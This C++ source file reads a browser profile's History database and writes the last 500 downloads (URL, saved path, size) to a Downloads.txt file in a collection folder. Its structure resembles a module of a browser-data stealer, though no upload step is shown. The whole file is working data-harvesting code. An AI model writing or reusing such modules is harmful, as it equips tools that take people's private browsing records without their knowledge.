//
// Created by .1qxz on 08.06.2024.
//

#include "CDownloads.h"

void CDownloads::execute(const fs::path &root, const std::string &name, const fs::path &path) {
    fs::path orig_db_path = path / this->getProfile() / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Download> history = CDownloads::getDownloads(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(const Download &row : history)
    {
        const long long KB = 1024;
        const long long MB = 1024 * KB;

        double result;
        std::string unit;
        const long long bytes = row.total_bytes;

        if(bytes >= MB)
        {
            result = static_cast<double>(bytes) / MB;
            unit = "MB";
        }
        else if(bytes >= KB)
        {
            result = static_cast<double>(bytes) / KB;
            unit = "KB";
        } else {
            result = static_cast<double>(bytes);
            unit = "B";
        }

        ss << "Url: " << row.url << "\n";
        ss << "  Saved as: " << row.saved_as << "\n";
        ss << "  Size: " << std::fixed << std::setprecision(1) << std::noshowpoint << result << unit << "\n";
        ss << "\n";
    }

    Utils::writeFile(root / "Downloads.txt", ss.str(), true);
}

std::list<Download> CDownloads::getDownloads(const fs::path &db_path) {
    std::list<Download> downloadList;
    sqlite3* db;
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_open(db_path.string().c_str(), &db);
    if (rc) {
        return {};
    }

    const char* sql = "SELECT current_path, total_bytes, tab_url FROM downloads ORDER BY start_time DESC LIMIT 500";
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        {}
        sqlite3_close(db);
        return downloadList;
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* target_path = sqlite3_column_text(stmt, 0);
        long long total_bytes = sqlite3_column_int64(stmt, 1);
        const unsigned char* tab_url = sqlite3_column_text(stmt, 2);

        Download downloadRecord;
        downloadRecord.saved_as = std::string(reinterpret_cast<const char*>(target_path));
        downloadRecord.total_bytes = total_bytes;
        downloadRecord.url = std::string(reinterpret_cast<const char*>(tab_url));

        downloadList.push_back(downloadRecord);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return downloadList;
}
